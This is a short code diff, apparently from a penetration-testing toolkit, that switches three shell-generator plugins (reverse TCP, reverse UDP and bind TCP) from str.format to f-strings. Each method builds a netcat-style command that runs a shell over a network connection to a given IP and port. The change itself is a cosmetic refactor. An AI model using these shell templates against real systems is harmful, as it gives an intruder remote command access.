@@ -23,7 +23,7 @@ class ReverseTCP(plugin.ReverseShell):
         self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
 
     def make_shell(self):
-        self.shell = "{} {} {} -e {}".format(self.args.type, self.args.ip, self.args.port, self.args.shell)
+        self.shell = f"{self.args.type} {self.args.ip} {self.args.port} -e {self.args.shell}"
 
 
 class ReverseUDP(plugin.ReverseShell):
@@ -40,7 +40,7 @@ class ReverseUDP(plugin.ReverseShell):
         self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
 
     def make_shell(self):
-        self.shell = "{} --udp {} {} -e {}".format(self.args.type, self.args.ip, self.args.port, self.args.shell)
+        self.shell = f"{self.args.type} --udp {self.args.ip} {self.args.port} -e {self.args.shell}"
 
 
 class BindTCP(plugin.BindShell):
@@ -65,4 +65,4 @@ class BindTCP(plugin.BindShell):
         self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
 
     def make_shell(self):
-        self.shell = "{} -l {} -e {}".format(self.args.type, self.args.port, self.args.shell)
+        self.shell = f"{self.args.type} -l {self.args.port} -e {self.args.shell}"
